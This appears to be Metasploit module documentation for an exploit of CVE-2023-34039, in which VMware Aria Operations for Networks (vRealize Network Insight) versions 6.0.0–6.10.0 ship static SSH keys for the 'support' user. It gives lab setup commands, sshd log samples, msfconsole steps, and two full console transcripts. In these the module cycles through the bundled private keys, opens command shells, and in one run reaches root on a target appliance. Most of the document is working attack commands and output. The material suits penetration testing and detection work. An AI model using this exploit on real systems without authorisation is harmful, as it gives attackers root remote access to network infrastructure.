## Vulnerable Application

VMWare Aria Operations for Networks (vRealize Network Insight) versions 6.0.0 through 6.10.0
do not randomize the SSH keys on virtual machine initialization. Since the key is easily
retrievable, an attacker can use it to gain unauthorized remote access as the "support" (root) user.

### Install

The ova files can be downloaded directly from VMWare. Depending on the license, only the most current (non-vulnerable)
images may be available.

If this is the case, we can emulate the user and keys with the following commands on Kali with SSH installed and running:

```
sudo adduser 'support'
sudo mkdir /home/support/.ssh
sudo touch /home/support/.ssh/authorized_keys
for filename in data/exploits/CVE-2023-34039/*; do
  ssh-keygen -f "$filename" -y | sudo tee -a /home/support/.ssh/authorized_keys
done
sudo chown support:support /home/support/.ssh
sudo chown support:support /home/support/.ssh/authorized_keys
sudo chmod 644 /home/support/.ssh/authorized_keys
sudo chmod 700 /home/support/.ssh
```

### Logs

Logs produced from this login will look like:

Failed login attempt:

`Oct 17 16:28:29 localhost sshd[51258]: Connection closed by authenticating user support 1.1.1.1 port 45463 [preauth]`

Successful login attempt:

`Oct 17 16:28:29 localhost sshd[51276]: Accepted publickey for support from 1.1.1.1 port 33913 ssh2: RSA SHA256:qhEwh/jQFLZqaOTAoUmp3B3+B4bIA2QgfxsvQ/HQO7o`

## Verification Steps

1. Install the application or ssh keys
1. Start msfconsole
1. Do: `use exploit/linux/ssh/vmware_vrni_known_privkey`
1. Do: `set rhosts [IP]`
1. Do: `run`
1. You should get a root level shell

## Options

### STOP_ON_SUCCESS

Stop SSH login attempts after the first session is obtained. Defaults to `true`

## Scenarios

### Emulated user on Kali Linux

```
msf6 > use exploit/linux/ssh/vmware_vrni_known_privkey
[*] Using configured payload cmd/unix/interact
msf6 exploit(linux/ssh/vmware_vrni_known_privkey) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(linux/ssh/vmware_vrni_known_privkey) > set verbose true
verbose => true
msf6 exploit(linux/ssh/vmware_vrni_known_privkey) > set stop_on_success false
stop_on_success => false
msf6 exploit(linux/ssh/vmware_vrni_known_privkey) > run

[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.0.0_platform
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.0.0_platform
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.0.0_proxy
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.0.0_proxy
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.10.0_collector
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.10.0_collector
[*] Command shell session 1 opened (127.0.0.1:36397 -> 127.0.0.1:22) at 2023-10-16 11:55:52 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.10.0_platform
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.10.0_platform
[*] Command shell session 2 opened (127.0.0.1:41437 -> 127.0.0.1:22) at 2023-10-16 11:55:55 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.1.0_platform
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.1.0_platform
[*] Command shell session 3 opened (127.0.0.1:35585 -> 127.0.0.1:22) at 2023-10-16 11:55:58 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.1.0_proxy
[*] Command shell session 4 opened (127.0.0.1:41267 -> 127.0.0.1:22) at 2023-10-16 11:56:01 -0400
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.1.0_proxy
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.2.0_collector
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.2.0_collector
[*] Command shell session 6 opened (127.0.0.1:37865 -> 127.0.0.1:22) at 2023-10-16 11:56:13 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.2.0_platform
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.2.0_platform
[*] Command shell session 7 opened (127.0.0.1:41153 -> 127.0.0.1:22) at 2023-10-16 11:56:21 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.3.0_collector
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.3.0_collector
[*] Command shell session 8 opened (127.0.0.1:40331 -> 127.0.0.1:22) at 2023-10-16 11:56:29 -0400
[*] Command shell session 5 opened (127.0.0.1:38481 -> 127.0.0.1:22) at 2023-10-16 11:56:30 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.3.0_platform
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.3.0_platform
[*] Command shell session 9 opened (127.0.0.1:41659 -> 127.0.0.1:22) at 2023-10-16 11:56:37 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.4.0_collector
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.4.0_collector
[*] Command shell session 10 opened (127.0.0.1:37923 -> 127.0.0.1:22) at 2023-10-16 11:56:45 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.4.0_platform
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.4.0_platform
[*] Command shell session 11 opened (127.0.0.1:36701 -> 127.0.0.1:22) at 2023-10-16 11:56:53 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.5.0_collector
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.5.0_collector
[*] Command shell session 12 opened (127.0.0.1:41667 -> 127.0.0.1:22) at 2023-10-16 11:57:01 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.5.0_platform
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.5.0_platform
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.6.0_collector
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.6.0_collector
[*] Command shell session 14 opened (127.0.0.1:33741 -> 127.0.0.1:22) at 2023-10-16 11:57:18 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.6.0_platform
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.6.0_platform
[*] Command shell session 15 opened (127.0.0.1:37171 -> 127.0.0.1:22) at 2023-10-16 11:57:26 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.7.0_collector
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.7.0_collector
[*] Command shell session 16 opened (127.0.0.1:37377 -> 127.0.0.1:22) at 2023-10-16 11:57:34 -0400
[*] Command shell session 13 opened (127.0.0.1:39213 -> 127.0.0.1:22) at 2023-10-16 11:57:34 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.7.0_platform
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.7.0_platform
[*] Command shell session 17 opened (127.0.0.1:35607 -> 127.0.0.1:22) at 2023-10-16 11:57:42 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.8.0_collector
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.8.0_collector
[*] Command shell session 18 opened (127.0.0.1:40607 -> 127.0.0.1:22) at 2023-10-16 11:57:50 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.8.0_platform
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.8.0_platform
[*] Command shell session 19 opened (127.0.0.1:33251 -> 127.0.0.1:22) at 2023-10-16 11:57:58 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.9.0_collector
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.9.0_collector
[*] Command shell session 20 opened (127.0.0.1:35357 -> 127.0.0.1:22) at 2023-10-16 11:58:06 -0400
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.9.0_platform
[+] 127.0.0.1:22 - Successful login via support@127.0.0.1:22 and ssh key /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.9.0_platform
[*] Found shell.

[*] Command shell session 22 opened (127.0.0.1:38695 -> 127.0.0.1:22) at 2023-10-16 11:58:23 -0400
[*] Command shell session 21 opened (127.0.0.1:41507 -> 127.0.0.1:22) at 2023-10-16 11:58:39 -0400

id
uid=1001(support) gid=1001(support) groups=1001(support),100(users)
```

### vRealize 6.8.0 Platform

```
msf6 > use exploit/linux/ssh/vmware_vrni_known_privkey
[*] Using configured payload cmd/unix/interact
msf6 exploit(linux/ssh/vmware_vrni_known_privkey) > set verbose true
verbose => true
msf6 exploit(linux/ssh/vmware_vrni_known_privkey) > set stop_on_success false
stop_on_success => false
msf6 exploit(linux/ssh/vmware_vrni_known_privkey) > set rhosts 2.2.2.2
rhosts => 2.2.2.2
msf6 exploit(linux/ssh/vmware_vrni_known_privkey) > run

[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.0.0_platform
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.0.0_proxy
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.10.0_collector
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.10.0_platform
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.1.0_platform
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.1.0_proxy
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.2.0_collector
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.2.0_platform
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.3.0_collector
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.3.0_platform
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.4.0_collector
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.4.0_platform
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.5.0_collector
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.5.0_platform
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.6.0_collector
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.6.0_platform
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.7.0_collector
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.7.0_platform
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.8.0_collector
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.8.0_platform
[+] 2.2.2.2:22 - Successful login via support@2.2.2.2:22 and ssh key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.8.0_platform
[*] Found shell.
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.9.0_collector
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Attempting key: /root/metasploit-framework/data/exploits/CVE-2023-34039/id_rsa_vnera_keypair_6.9.0_platform
[-] 2.2.2.2:22 SSH - Failed authentication
[*] Command shell session 1 opened (1.1.1.1:41377 -> 2.2.2.2:22) at 2023-10-16 14:42:10 -0400

id
uid=1001(support) gid=1001(support) groups=1001(support),27(sudo),1003(vrniusers),1004(fdbusers)
cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.6 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.6 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
id
uid=0(root) gid=0(root) groups=0(root)
```
